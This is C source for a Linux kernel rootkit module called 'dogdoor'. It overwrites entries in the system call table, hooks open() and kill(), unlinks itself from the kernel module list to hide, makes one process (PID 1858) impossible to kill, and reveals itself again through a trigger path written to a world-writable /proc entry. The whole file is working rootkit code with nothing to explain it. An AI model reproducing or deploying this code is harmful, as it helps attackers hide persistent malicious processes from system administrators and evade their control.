#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/signal.h>
#include <linux/list.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

char filepath[128] = { 0x0, } ;
void ** sctable ;
int count = 0;

static
struct module_node{
	struct module *mod;
	struct list_head *mod_next;
} ;

static struct list_head *mod_prev;
static int hidden = 0;

static
void hide_module (struct module *mod) {
	if (mod == THIS_MODULE){
		mod_prev= mod->list.prev;
	} else {	
		struct module_node *mod_node ;
		mod_node = kmalloc (sizeof(struct module_node), GFP_KERNEL);
		mod_node->mod = mod;
		mod_node->mod_next = mod->list.next;
	}
	list_del(&mod->list);
}

static
void module_hide (void) {
	if (hidden)
		return;
	hide_module(THIS_MODULE);
	hidden = 1;
}

static
void unhide_module (struct module *mod, struct list_head *head) {
	if (mod == THIS_MODULE)
		list_add(&mod->list, head);
	else
		list_add_tail(&mod->list, head);
}

static 
void module_unhide (void) {
	if (!hidden)
		return;
	unhide_module(THIS_MODULE, mod_prev);
	hidden = 0;
}


asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 

asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_t mode)
{
	char fname[256] ;

	copy_from_user(fname, filename, 256) ;

	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
		count++ ;
		module_unhide();
	}
	return orig_sys_open(filename, flags, mode) ;
}


asmlinkage long (*orig_sys_kill)(pid_t pid, int sig) ; 

asmlinkage long dogdoor_sys_kill(pid_t pid, int sig) 
{
	if (pid==(pid_t)(1858))
		return -1;
	return orig_sys_kill(pid, sig);
}


static 
int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0 ;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[256] ;
	ssize_t toread ;

	sprintf(buf, "%s\n", filepath) ;

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	

	*offset = *offset + toread ;

	return toread ;
}

static 
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[128] ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;

	sscanf(buf,"%s", filepath) ;
	count = 0;
	*offset = strlen(buf) ;

	return *offset ;
}

static const struct file_operations dogdoor_fops = {
	.owner = 	THIS_MODULE,
	.open = 	dogdoor_proc_open,
	.read = 	dogdoor_proc_read,
	.write = 	dogdoor_proc_write,
	.llseek = 	seq_lseek,
	.release = 	dogdoor_proc_release,
} ;

static 
int __init dogdoor_init(void) {
	unsigned int level ; 
	pte_t * pte ;

	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open] ;
	orig_sys_kill = sctable[__NR_kill] ;

	module_hide();
	pte = lookup_address((unsigned long) sctable, &level) ;
	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW ;		

	sctable[__NR_kill] = dogdoor_sys_kill ;
	sctable[__NR_open] = openhook_sys_open ;

	return 0;
}

static 
void __exit dogdoor_exit(void) {
	unsigned int level ;
	pte_t * pte ;
	remove_proc_entry("dogdoor", NULL) ;

	sctable[__NR_open] = orig_sys_open ;
	sctable[__NR_kill] = orig_sys_kill ;

	pte = lookup_address((unsigned long) sctable, &level) ;
	pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
